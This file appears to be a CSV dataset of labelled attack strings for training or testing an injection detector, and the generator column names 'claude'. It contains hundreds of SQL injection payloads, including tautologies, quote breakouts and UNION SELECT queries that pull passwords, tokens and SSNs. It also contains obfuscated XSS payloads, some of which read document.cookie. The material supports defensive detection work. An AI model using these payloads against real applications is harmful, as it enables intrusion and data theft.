text,label,attack_type,category,generator
list logs where pwd is anything or condition always holds,1,sqli,nl_framed,claude
x' Or 'a'='x;,1,sqli,quote_breakout,claude
"""><object onbeforetoggle=alert(document.cookie)>",1,xss,xss_obf,claude
give cards where hash is anything or condition always holds,1,sqli,nl_framed,claude
5 And (select count(*) from members)>0#,1,sqli,nl_framed,claude
fetch any staff where 8 equals 5 or true,1,sqli,nl_framed,claude
Or exists(select password from logs)/*c*/,1,sqli,nl_framed,claude
"<img
src=x/onerror=print()>",1,xss,xss_obf,claude
<details onstart=window['al'+'ert']`1`>,1,xss,xss_obf,claude
"""><audio onfocus=alert`1`>",1,xss,xss_obf,claude
please render <xss onload=alert(1)> here for the user,1,xss,xss_obf,claude
1 or 7=8;,1,sqli,bare_logic,claude
<input onpointerrawupdate=window['al'+'ert']`1`>,1,xss,xss_obf,claude
9 Or 3=3,1,sqli,bare_logic,claude
<SvG onErrOR=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
char(57) oR char(56)=char(49),1,sqli,encoding,claude
<SvG onERrOr=alert(1)>,1,xss,xss_obf,claude
1 or exists(select secret from orders)-- ,1,sqli,nl_framed,claude
OR exists(select dob from people)%00,1,sqli,nl_framed,claude
"9 uniON/**/SELeCT secret,uid FrOM members-- x",1,sqli,nl_framed,claude
"3	uniOn SElEct token,ssn frOM people/*c*/",1,sqli,nl_framed,claude
<style onafterscriptexecute=self['al'+'ert']`1`>,1,xss,xss_obf,claude
8 UNioN/**/sELeCT token FROM auth-- -,1,sqli,nl_framed,claude
0x33 Or 0x90=0x96,1,sqli,encoding,claude
can you show the field <embed onanimationstart=alert`1`> when it errors,1,xss,xss_obf,claude
8 aNd (select count(*) from members)>1-- x,1,sqli,nl_framed,claude
9 or 5=3/*c*/,1,sqli,bare_logic,claude
<table onanimationstart=self['al'+'ert']`1`>,1,xss,xss_obf,claude
<BoDy oNErRor=alert(1)>,1,xss,xss_obf,claude
or exists(select secret from admins)/**/,1,sqli,nl_framed,claude
retrieve any clients where 4 is 4 or true,1,sqli,nl_framed,claude
1' Or 'y'='x/*c*/,1,sqli,quote_breakout,claude
char(57) oR char(50)=char(50),1,sqli,encoding,claude
dump each profiles where 7 equals 1 or true,1,sqli,nl_framed,claude
select auth where password is anything or condition always holds,1,sqli,nl_framed,claude
return auth where apikey is anything or condition always holds,1,sqli,nl_framed,claude
9 AND (select count(*) from sessions)>1,1,sqli,nl_framed,claude
1 Or pwd lIke '%'-- -,1,sqli,quote_breakout,claude
"<img
src=x
onerror=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
please render <math oncontentvisibilityautostatechange=alert(1)> here for the user,1,xss,xss_obf,claude
1 or exists(select email from sessions)%00,1,sqli,nl_framed,claude
please render <math onanimationstart=alert`1`> here for the user,1,xss,xss_obf,claude
9 OR dob lIKe '%'#,1,sqli,quote_breakout,claude
<svg/onbeforetoggle=confirm(1)>,1,xss,xss_obf,claude
5 oR tRUe,1,sqli,bare_logic,claude
x' or 'z'='b;,1,sqli,quote_breakout,claude
Or exists(select pwd from orders)%00,1,sqli,nl_framed,claude
select every sessions where 1 equals 7 or true,1,sqli,nl_framed,claude
list the token of any sessions regardless of id,1,sqli,nl_framed,claude
6 or balance Like '%'-- -,1,sqli,quote_breakout,claude
admin' or 'x'='x-- x,1,sqli,quote_breakout,claude
dump people where secret is anything or condition always holds,1,sqli,nl_framed,claude
<form ontoggle=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
"""><style onstart=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
<details	onstart=alert(document.cookie)>,1,xss,xss_obf,claude
<styleonanimationstart=top['al'+'ert'](1)>,1,xss,xss_obf,claude
<isindex onanimationstart=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
<img/src=x onerror=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
please render <audio onafterscriptexecute=alert(document.domain)> here for the user,1,xss,xss_obf,claude
8 OR 5=4/*c*/,1,sqli,bare_logic,claude
please render <table onfocus=alert`1`> here for the user,1,xss,xss_obf,claude
x' Or 'y'='x-- -,1,sqli,quote_breakout,claude
please render <audio onanimationstart=alert(document.domain)> here for the user,1,xss,xss_obf,claude
please render <form onstart=top['al'+'ert'](1)> here for the user,1,xss,xss_obf,claude
"5/**/uniON%20select token,apikey,email fROM accounts#",1,sqli,nl_framed,claude
can you show the field <video onbeforetoggle=top['al'+'ert'](1)> when it errors,1,xss,xss_obf,claude
list members where email is anything or condition always holds,1,sqli,nl_framed,claude
9 Or role LIke '%',1,sqli,quote_breakout,claude
1 or exists(select hash from cards),1,sqli,nl_framed,claude
retrieve accounts where email is anything or condition always holds,1,sqli,nl_framed,claude
select the dob of each logs regardless of id,1,sqli,nl_framed,claude
6 or 8=3/**/,1,sqli,bare_logic,claude
1 AND (select count(*) from staff)>2,1,sqli,nl_framed,claude
get every profiles where 6 equals 2 or true,1,sqli,nl_framed,claude
can you show the field <embed onanimationstart=window['ale'+'rt']`1`> when it errors,1,xss,xss_obf,claude
<IMG onERrOR=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
<frameset onpageshow=top['al'+'ert']`1`>,1,xss,xss_obf,claude
"""><video onfocus=alert(document.domain)>",1,xss,xss_obf,claude
show me each members where 1 equals 8 or true,1,sqli,nl_framed,claude
dump any tokens where 8 equals 9 or true,1,sqli,nl_framed,claude
1 OR exists(select uid from accounts)#,1,sqli,nl_framed,claude
<embedonscrollend=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
"""><marquee onafterscriptexecute=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
fetch each members where 5 is 1 or true,1,sqli,nl_framed,claude
get the balance of any staff regardless of id,1,sqli,nl_framed,claude
<a href=&#106;avascript:alert(1)>x</a>,1,xss,xss_obf,claude
<svg/onpageshow=print()>,1,xss,xss_obf,claude
show me every auth where 8 = 1 or true,1,sqli,nl_framed,claude
char(51) Or char(50)=char(51),1,sqli,encoding,claude
<svg/onscrollend=alert`1`>,1,xss,xss_obf,claude
char(55) oR char(48)=char(56),1,sqli,encoding,claude
0x72 Or 0x98=0x29,1,sqli,encoding,claude
get any staff where 7 is 1 or true,1,sqli,nl_framed,claude
<SvG OneRROr=alert`1`>,1,xss,xss_obf,claude
"""><keygen onstart=alert(document.domain)>",1,xss,xss_obf,claude
3 or TrUe,1,sqli,bare_logic,claude
9 anD (select count(*) from users)>3,1,sqli,nl_framed,claude
char(56) Or char(52)=char(48),1,sqli,encoding,claude
give any logs where 2 equals 4 or true,1,sqli,nl_framed,claude
"""><keygen onbeforetoggle=confirm(1)>",1,xss,xss_obf,claude
can you show the field <embed oncontentvisibilityautostatechange=alert`1`> when it errors,1,xss,xss_obf,claude
3 AND (select count(*) from cards)>3,1,sqli,nl_framed,claude
"""><video ontoggle=print()>",1,xss,xss_obf,claude
1 oR exists(select dob from auth),1,sqli,nl_framed,claude
7 or ssn LiKE '%'-- x,1,sqli,quote_breakout,claude
<textarea onstart=top['al'+'ert']`1`>,1,xss,xss_obf,claude
5%20UnioN%20sELeCT secret fROM cards,1,sqli,nl_framed,claude
9 aNd (select count(*) from people)>3/**/,1,sqli,nl_framed,claude
1' Or 'x'='a/*c*/,1,sqli,quote_breakout,claude
fetch cards where pwd is anything or condition always holds,1,sqli,nl_framed,claude
5 oR ssn likE '%'%00,1,sqli,quote_breakout,claude
<img%20src=xonerror=top['al'+'ert'](1)>,1,xss,xss_obf,claude
<styleoncontentvisibilityautostatechange=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
"""><embed onbeforetoggle=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
1 OR exists(select email from tokens)#,1,sqli,nl_framed,claude
"<img	src=x
onerror=top['al'+'ert'](1)>",1,xss,xss_obf,claude
"""><iframe onanimationstart=print()>",1,xss,xss_obf,claude
<iFrAmE oneRroR=print()>,1,xss,xss_obf,claude
admin' oR 'x'='y/*c*/,1,sqli,quote_breakout,claude
1 Or trUE,1,sqli,bare_logic,claude
2 aNd (select count(*) from cards)>0%00,1,sqli,nl_framed,claude
dump the pwd of every members regardless of id,1,sqli,nl_framed,claude
<iFrAmE OnErROr=alert(1)>,1,xss,xss_obf,claude
<embed%20onfocus=confirm(1)>,1,xss,xss_obf,claude
admin' or 'y'='y-- -,1,sqli,quote_breakout,claude
2 Or 2=8%00,1,sqli,bare_logic,claude
7 OR TRUe,1,sqli,bare_logic,claude
0x27 OR 0x55=0x68,1,sqli,encoding,claude
1 AnD (select count(*) from staff)>2/*c*/,1,sqli,nl_framed,claude
show me the uid of each members regardless of id,1,sqli,nl_framed,claude
char(50) or char(57)=char(50),1,sqli,encoding,claude
please render <svg onscrollend=alert(document.domain)> here for the user,1,xss,xss_obf,claude
<select%09onbeforetoggle=print()>,1,xss,nl_framed,claude
Or exists(select token from users)-- -,1,sqli,nl_framed,claude
<embed onbeforetoggle=self['al'+'ert']`1`>,1,xss,xss_obf,claude
get the apikey of each orders regardless of id,1,sqli,nl_framed,claude
list every auth where 8 = 4 or true,1,sqli,nl_framed,claude
"""><iframe onbeforetoggle=top['al'+'ert'](1)>",1,xss,xss_obf,claude
can you show the field <textarea onload=window['ale'+'rt']`1`> when it errors,1,xss,xss_obf,claude
fetch sessions where dob is anything or condition always holds,1,sqli,nl_framed,claude
1 oR 1=1;,1,sqli,bare_logic,claude
<svg/onerror=alert(document.domain)>,1,xss,xss_obf,claude
6 ANd (select count(*) from tokens)>2-- x,1,sqli,nl_framed,claude
can you show the field <body onpageshow=print()> when it errors,1,xss,xss_obf,claude
"<keygen
onpointerrawupdate=top['al'+'ert'](1)>",1,xss,xss_obf,claude
5 or pwd liKE '%'/**/,1,sqli,quote_breakout,claude
list the secret of all tokens regardless of id,1,sqli,nl_framed,claude
return each auth where 7 equals 6 or true,1,sqli,nl_framed,claude
return the role of any members regardless of id,1,sqli,nl_framed,claude
"""><xss onstart=alert(document.domain)>",1,xss,xss_obf,claude
char(52) or char(50)=char(56),1,sqli,encoding,claude
fetch any tokens where 9 is 4 or true,1,sqli,nl_framed,claude
<select ontoggle=top['al'+'ert']`1`>,1,xss,nl_framed,claude
list sessions where role is anything or condition always holds,1,sqli,nl_framed,claude
<object onafterscriptexecute=self['al'+'ert']`1`>,1,xss,xss_obf,claude
1 AnD (select count(*) from members)>3#,1,sqli,nl_framed,claude
0 OR 3=6/**/,1,sqli,bare_logic,claude
1 or TrUe,1,sqli,bare_logic,claude
give any logs where 5 equals 5 or true,1,sqli,nl_framed,claude
can you show the field <style onbeforetoggle=alert(document.cookie)> when it errors,1,xss,xss_obf,claude
0x81 Or 0x29=0x97,1,sqli,encoding,claude
"<img
src=x/onerror=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
<img	src=xonerror=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
please render <form onstart=confirm(1)> here for the user,1,xss,xss_obf,claude
5 aND (select count(*) from members)>1-- x,1,sqli,nl_framed,claude
fetch the ssn of each accounts regardless of id,1,sqli,nl_framed,claude
2 or email lIkE '%'/*c*/,1,sqli,quote_breakout,claude
give any staff where 5 is 4 or true,1,sqli,nl_framed,claude
<svg/onload=alert(document.cookie)>,1,xss,xss_obf,claude
admin' oR 'a'='a/*c*/,1,sqli,quote_breakout,claude
3 aND (select count(*) from admins)>1/**/,1,sqli,nl_framed,claude
3 oR 6=7;,1,sqli,bare_logic,claude
<isindex%20onbeforetoggle=alert(document.domain)>,1,xss,xss_obf,claude
give each members where 8 is 8 or true,1,sqli,nl_framed,claude
4%20uNiON sELecT ssn From users#,1,sqli,nl_framed,claude
<SvG oneRroR=confirm(1)>,1,xss,xss_obf,claude
"1 uNiON SeLECt dob,role,token From sessions%00",1,sqli,nl_framed,claude
1 anD (select count(*) from staff)>1%00,1,sqli,nl_framed,claude
can you show the field <details oncontentvisibilityautostatechange=alert(document.cookie)> when it errors,1,xss,xss_obf,claude
1 ANd (select count(*) from tokens)>2-- x,1,sqli,nl_framed,claude
list staff where uid is anything or condition always holds,1,sqli,nl_framed,claude
"""><marquee oncontentvisibilityautostatechange=alert(document.domain)>",1,xss,xss_obf,claude
"""><details onpointerrawupdate=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
char(56) or char(57)=char(52),1,sqli,encoding,claude
4 Or uid liKe '%'%00,1,sqli,quote_breakout,claude
2 Or 1=7/*c*/,1,sqli,bare_logic,claude
<svg/ontoggle=alert`1`>,1,xss,xss_obf,claude
"8/**/Union/**/selECT password,ssn FrOM accounts%00",1,sqli,nl_framed,claude
0x30 OR 0x18=0x71,1,sqli,encoding,claude
1 oR exists(select hash from clients)/**/,1,sqli,nl_framed,claude
select cards where token is anything or condition always holds,1,sqli,nl_framed,claude
9 AnD (select count(*) from orders)>3%00,1,sqli,nl_framed,claude
1 Or TRuE,1,sqli,bare_logic,claude
2	UNiOn%20sELeCT role FRom members/*c*/,1,sqli,nl_framed,claude
2 OR TRUe,1,sqli,bare_logic,claude
<math onstart=self['al'+'ert']`1`>,1,xss,xss_obf,claude
<BoDy onerrOR=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
<BoDy oNeRROr=alert(document.domain)>,1,xss,xss_obf,claude
Or exists(select ssn from users)/*c*/,1,sqli,nl_framed,claude
select any tokens where 4 is 3 or true,1,sqli,nl_framed,claude
0x70 oR 0x20=0x67,1,sqli,encoding,claude
5 OR 5=3-- ,1,sqli,bare_logic,claude
"<imgsrc=x
onerror=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
8 and (select count(*) from auth)>0-- ,1,sqli,nl_framed,claude
can you show the field <frameset onstart=alert(1)> when it errors,1,xss,xss_obf,claude
7 oR tRUe,1,sqli,bare_logic,claude
1 oR uid lIKE '%'/*c*/,1,sqli,quote_breakout,claude
<img%09src=xonerror=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
get the secret of every sessions regardless of id,1,sqli,nl_framed,claude
admin' OR 'z'='a-- -,1,sqli,quote_breakout,claude
1 or exists(select ssn from accounts)#,1,sqli,nl_framed,claude
6 Or TrUe,1,sqli,bare_logic,claude
2 Or apikey LIKE '%'-- ,1,sqli,quote_breakout,claude
can you show the field <video onafterscriptexecute=alert`1`> when it errors,1,xss,xss_obf,claude
1' Or 'y'='z/*c*/,1,sqli,quote_breakout,claude
x' or 'a'='z#,1,sqli,quote_breakout,claude
8 And (select count(*) from tokens)>2-- -,1,sqli,nl_framed,claude
<BoDy OnerRoR=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
can you show the field <textarea oncontentvisibilityautostatechange=alert(1)> when it errors,1,xss,xss_obf,claude
please render <input onbeforetoggle=window['ale'+'rt']`1`> here for the user,1,xss,xss_obf,claude
9 Or 3=5#,1,sqli,bare_logic,claude
list the hash of all profiles regardless of id,1,sqli,nl_framed,claude
x' Or 'b'='z;,1,sqli,quote_breakout,claude
please render <style onstart=top['al'+'ert'](1)> here for the user,1,xss,xss_obf,claude
8 OR hash lIKe '%'/*c*/,1,sqli,quote_breakout,claude
"""><embed ontoggle=alert(1)>",1,xss,xss_obf,claude
1' or 'z'='y-- -,1,sqli,quote_breakout,claude
6 oR 9=4-- ,1,sqli,bare_logic,claude
root' oR 'a'='a/**/,1,sqli,quote_breakout,claude
can you show the field <video onafterscriptexecute=alert(document.domain)> when it errors,1,xss,xss_obf,claude
8 OR 3=5-- ,1,sqli,bare_logic,claude
"""><frameset onpointerrawupdate=alert(document.domain)>",1,xss,xss_obf,claude
get users where secret is anything or condition always holds,1,sqli,nl_framed,claude
<img%20src=x onerror=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
9 or 2=8,1,sqli,bare_logic,claude
"""><math onanimationstart=alert`1`>",1,xss,xss_obf,claude
x' or 'x'='x-- ,1,sqli,quote_breakout,claude
please render <xss onerror=top['al'+'ert'](1)> here for the user,1,xss,xss_obf,claude
0x99 OR 0x81=0x99,1,sqli,encoding,claude
"7 UNIoN/**/SeLecT secret,ssn fROM accounts",1,sqli,nl_framed,claude
<img%20src=x%20onerror=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
3 oR tRue,1,sqli,bare_logic,claude
1 or exists(select secret from users)-- -,1,sqli,nl_framed,claude
admin' OR 'y'='y;,1,sqli,quote_breakout,claude
fetch orders where email is anything or condition always holds,1,sqli,nl_framed,claude
<iFrAmE OnErRor=confirm(1)>,1,xss,xss_obf,claude
"<frameset
onscrollend=print()>",1,xss,xss_obf,claude
<audio onbeforetoggle=confirm(1)>,1,xss,xss_obf,claude
"<img/src=x
onerror=confirm(1)>",1,xss,xss_obf,claude
fetch the hash of every staff regardless of id,1,sqli,nl_framed,claude
<isindex onpointerrawupdate=window['al'+'ert']`1`>,1,xss,xss_obf,claude
"""><math oncontentvisibilityautostatechange=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
please render <embed oncontentvisibilityautostatechange=window['ale'+'rt']`1`> here for the user,1,xss,xss_obf,claude
return any users where 4 equals 8 or true,1,sqli,nl_framed,claude
1 uNiOn/**/SELECt role FrOm profiles-- ,1,sqli,nl_framed,claude
5 And (select count(*) from clients)>2%00,1,sqli,nl_framed,claude
dump the role of every sessions regardless of id,1,sqli,nl_framed,claude
7 and (select count(*) from clients)>0/**/,1,sqli,nl_framed,claude
can you show the field <textarea onbeforetoggle=alert(1)> when it errors,1,xss,xss_obf,claude
<img	src=x/onerror=alert`1`>,1,xss,xss_obf,claude
retrieve orders where email is anything or condition always holds,1,sqli,nl_framed,claude
char(56) oR char(49)=char(50),1,sqli,encoding,claude
select logs where role is anything or condition always holds,1,sqli,nl_framed,claude
7 OR TrUE,1,sqli,bare_logic,claude
0x39 OR 0x57=0x69,1,sqli,encoding,claude
get cards where uid is anything or condition always holds,1,sqli,nl_framed,claude
0x82 or 0x61=0x80,1,sqli,encoding,claude
<img src=x onerror=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
char(52) or char(50)=char(57),1,sqli,encoding,claude
1 OR exists(select hash from sessions)/*c*/,1,sqli,nl_framed,claude
x' or 'z'='a#,1,sqli,quote_breakout,claude
can you show the field <form onfocus=alert`1`> when it errors,1,xss,xss_obf,claude
1 OR token liKe '%';,1,sqli,quote_breakout,claude
<imgsrc=x%09onerror=alert(document.cookie)>,1,xss,xss_obf,claude
list every logs where 1 = 1 or true,1,sqli,nl_framed,claude
4 or role lIKe '%'#,1,sqli,quote_breakout,claude
"2/**/uNiON/**/SeLect pwd,role,hash FrOm sessions%00",1,sqli,nl_framed,claude
fetch the pwd of every auth regardless of id,1,sqli,nl_framed,claude
<img%09src=x	onerror=top['al'+'ert'](1)>,1,xss,xss_obf,claude
<svg/onstart=print()>,1,xss,xss_obf,claude
give the hash of any members regardless of id,1,sqli,nl_framed,claude
0x18 oR 0x63=0x51,1,sqli,encoding,claude
char(57) oR char(51)=char(55),1,sqli,encoding,claude
"""><details onbeforetoggle=print()>",1,xss,xss_obf,claude
1 OR 3=5-- ,1,sqli,bare_logic,claude
"<video
onerror=alert(1)>",1,xss,xss_obf,claude
<svg/ontoggle=alert(1)>,1,xss,xss_obf,claude
6%20UNion%20sELEcT pwd FroM clients/*c*/,1,sqli,nl_framed,claude
0x61 or 0x77=0x28,1,sqli,encoding,claude
1 Or ssn LiKe '%'%00,1,sqli,quote_breakout,claude
6 OR TRuE,1,sqli,bare_logic,claude
3 oR apikey like '%'/**/,1,sqli,quote_breakout,claude
return all cards where 8 equals 2 or true,1,sqli,nl_framed,claude
char(55) OR char(56)=char(55),1,sqli,encoding,claude
3 OR 7=7/*c*/,1,sqli,bare_logic,claude
6 or 6=1-- -,1,sqli,bare_logic,claude
1 oR exists(select ssn from people);,1,sqli,nl_framed,claude
char(50) or char(53)=char(55),1,sqli,encoding,claude
x' Or 'z'='b#,1,sqli,quote_breakout,claude
6 Or TRUE,1,sqli,bare_logic,claude
0x89 oR 0x52=0x31,1,sqli,encoding,claude
<img%09src=x/onerror=alert(document.cookie)>,1,xss,xss_obf,claude
please render <keygen onerror=eval(atob('YWxlcnQoMSk'))> here for the user,1,xss,xss_obf,claude
1 Or exists(select ssn from users)%00,1,sqli,nl_framed,claude
<object%09onbeforetoggle=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
5 Or 4=3#,1,sqli,bare_logic,claude
"""><object ontoggle=top['al'+'ert'](1)>",1,xss,xss_obf,claude
show me the email of all logs regardless of id,1,sqli,nl_framed,claude
});alert(document.cookie);//,1,xss,xss_obf,claude
list the hash of all tokens regardless of id,1,sqli,nl_framed,claude
give the ssn of each admins regardless of id,1,sqli,nl_framed,claude
6 oR 2=3/*c*/,1,sqli,bare_logic,claude
dump all tokens where 6 = 6 or true,1,sqli,nl_framed,claude
7 or email LIKe '%'/**/,1,sqli,quote_breakout,claude
show me every clients where 6 equals 7 or true,1,sqli,nl_framed,claude
1' or 'a'='x,1,sqli,quote_breakout,claude
0x52 oR 0x22=0x63,1,sqli,encoding,claude
0x53 or 0x60=0x79,1,sqli,encoding,claude
"4 UniON seLecT password,ssn FROM profiles-- x",1,sqli,nl_framed,claude
can you show the field <xss onbeforetoggle=alert`1`> when it errors,1,xss,xss_obf,claude
can you show the field <table onanimationstart=eval(atob('YWxlcnQoMSk'))> when it errors,1,xss,xss_obf,claude
<img/src=x	onerror=alert(1)>,1,xss,xss_obf,claude
1' OR 'x'='a%00,1,sqli,quote_breakout,claude
0x69 oR 0x38=0x83,1,sqli,encoding,claude
fetch the uid of all cards regardless of id,1,sqli,nl_framed,claude
char(53) OR char(53)=char(53),1,sqli,encoding,claude
"1	unION%20SeLeCt token,secret froM admins-- ",1,sqli,nl_framed,claude
3 OR trUE,1,sqli,bare_logic,claude
please render <svg onpointerrawupdate=print()> here for the user,1,xss,xss_obf,claude
please render <style onbeforetoggle=print()> here for the user,1,xss,xss_obf,claude
0 OR 1=1;,1,sqli,bare_logic,claude
dump members where apikey is anything or condition always holds,1,sqli,nl_framed,claude
0x55 Or 0x99=0x83,1,sqli,encoding,claude
<svg/onfocus=top['al'+'ert'](1)>,1,xss,xss_obf,claude
<IMG OnERroR=print()>,1,xss,xss_obf,claude
give any tokens where 5 equals 8 or true,1,sqli,nl_framed,claude
fetch any staff where 9 equals 5 or true,1,sqli,nl_framed,claude
"8%20unIoN%20selECT token,hash,email FROm clients-- x",1,sqli,nl_framed,claude
7 or trUe,1,sqli,bare_logic,claude
2 Or truE,1,sqli,bare_logic,claude
1 OR exists(select ssn from members)#,1,sqli,nl_framed,claude
fetch the dob of any admins regardless of id,1,sqli,nl_framed,claude
select the email of each clients regardless of id,1,sqli,nl_framed,claude
can you show the field <xss onafterscriptexecute=window['ale'+'rt']`1`> when it errors,1,xss,xss_obf,claude
<svg/ontoggle=alert(document.cookie)>,1,xss,xss_obf,claude
give any auth where 4 = 7 or true,1,sqli,nl_framed,claude
6 AnD (select count(*) from auth)>2-- -,1,sqli,nl_framed,claude
<IMG OnErroR=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
<svg/onbeforetoggle=print()>,1,xss,xss_obf,claude
6 Or TruE,1,sqli,bare_logic,claude
1 or exists(select email from tokens)-- ,1,sqli,nl_framed,claude
<svg/onerror=print()>,1,xss,xss_obf,claude
<svg/onload=alert`1`>,1,xss,xss_obf,claude
0x64 oR 0x43=0x48,1,sqli,encoding,claude
char(50) Or char(54)=char(48),1,sqli,encoding,claude
<embed onanimationstart=top['al'+'ert']`1`>,1,xss,xss_obf,claude
root' or 'y'='x-- ,1,sqli,quote_breakout,claude
0x42 oR 0x99=0x94,1,sqli,encoding,claude
char(51) or char(53)=char(56),1,sqli,encoding,claude
please render <video onscrollend=eval(atob('YWxlcnQoMSk'))> here for the user,1,xss,xss_obf,claude
"7%20unIoN selEcT hash,apikey,ssn from clients;",1,sqli,nl_framed,claude
7 aND (select count(*) from members)>3-- x,1,sqli,nl_framed,claude
6 OR 4=5,1,sqli,bare_logic,claude
1 OR exists(select email from users)/*c*/,1,sqli,nl_framed,claude
9	uniON%20seleCt hash FROM orders,1,sqli,nl_framed,claude
select tokens where balance is anything or condition always holds,1,sqli,nl_framed,claude
0x62 OR 0x72=0x62,1,sqli,encoding,claude
please render <isindex onstart=alert(1)> here for the user,1,xss,xss_obf,claude
2 Or 3=5-- x,1,sqli,bare_logic,claude
get cards where token is anything or condition always holds,1,sqli,nl_framed,claude
get staff where password is anything or condition always holds,1,sqli,nl_framed,claude
"""><isindex onfocus=confirm(1)>",1,xss,xss_obf,claude
root' oR 'y'='x-- -,1,sqli,quote_breakout,claude
<SvG OnErrOr=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
"""><video onanimationstart=top['al'+'ert'](1)>",1,xss,xss_obf,claude
dump the secret of all auth regardless of id,1,sqli,nl_framed,claude
"""><xss onpageshow=alert(1)>",1,xss,xss_obf,claude
<SvG ONerRoR=alert(document.domain)>,1,xss,xss_obf,claude
"5 uniOn sELEcT dob,password,hash FROM clients",1,sqli,nl_framed,claude
7 Or 6=6-- x,1,sqli,bare_logic,claude
0x21 Or 0x76=0x98,1,sqli,encoding,claude
please render <object onfocus=window['ale'+'rt']`1`> here for the user,1,xss,xss_obf,claude
can you show the field <isindex ontoggle=alert`1`> when it errors,1,xss,xss_obf,claude
<svg/onafterscriptexecute=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
<IMG onERRor=top['al'+'ert'](1)>,1,xss,xss_obf,claude
"9%20UNIOn/**/SElECT token,password frOm auth",1,sqli,nl_framed,claude
3 Or true,1,sqli,bare_logic,claude
fetch all members where 3 is 3 or true,1,sqli,nl_framed,claude
7 or 1=4-- ,1,sqli,bare_logic,claude
please render <iframe onpageshow=eval(atob('YWxlcnQoMSk'))> here for the user,1,xss,xss_obf,claude
1' oR 'x'='b/**/,1,sqli,quote_breakout,claude
oR exists(select dob from members)#,1,sqli,nl_framed,claude
show me admins where password is anything or condition always holds,1,sqli,nl_framed,claude
6 oR 8=8-- ,1,sqli,bare_logic,claude
dump sessions where uid is anything or condition always holds,1,sqli,nl_framed,claude
can you show the field <textarea onpageshow=print()> when it errors,1,xss,xss_obf,claude
8 and (select count(*) from tokens)>1#,1,sqli,nl_framed,claude
6 Or uid lIkE '%';,1,sqli,quote_breakout,claude
please render <frameset onerror=print()> here for the user,1,xss,xss_obf,claude
admin' OR 'z'='x/*c*/,1,sqli,quote_breakout,claude
9 AnD (select count(*) from members)>0%00,1,sqli,nl_framed,claude
6/**/uNioN SELecT apikey FRom cards/**/,1,sqli,nl_framed,claude
<SvG oNerRoR=alert(document.cookie)>,1,xss,xss_obf,claude
please render <xss onanimationstart=top['al'+'ert'](1)> here for the user,1,xss,xss_obf,claude
return accounts where pwd is anything or condition always holds,1,sqli,nl_framed,claude
dump clients where secret is anything or condition always holds,1,sqli,nl_framed,claude
1 or exists(select hash from admins),1,sqli,nl_framed,claude
5 oR trUE,1,sqli,bare_logic,claude
1 Or exists(select email from users)-- x,1,sqli,nl_framed,claude
please render <form onbeforetoggle=confirm(1)> here for the user,1,xss,xss_obf,claude
please render <svg onpageshow=window['ale'+'rt']`1`> here for the user,1,xss,xss_obf,claude
char(55) oR char(52)=char(49),1,sqli,encoding,claude
1 OR exists(select password from sessions)-- x,1,sqli,nl_framed,claude
4 or secret LiKe '%'#,1,sqli,quote_breakout,claude
"<form
onbeforetoggle=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
"""><table onpointerrawupdate=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
x' OR 'y'='z/**/,1,sqli,quote_breakout,claude
"5/**/unIon/**/seLeCT email,pwd,secret fROM tokens-- x",1,sqli,nl_framed,claude
<SvG OnErroR=alert(1)>,1,xss,xss_obf,claude
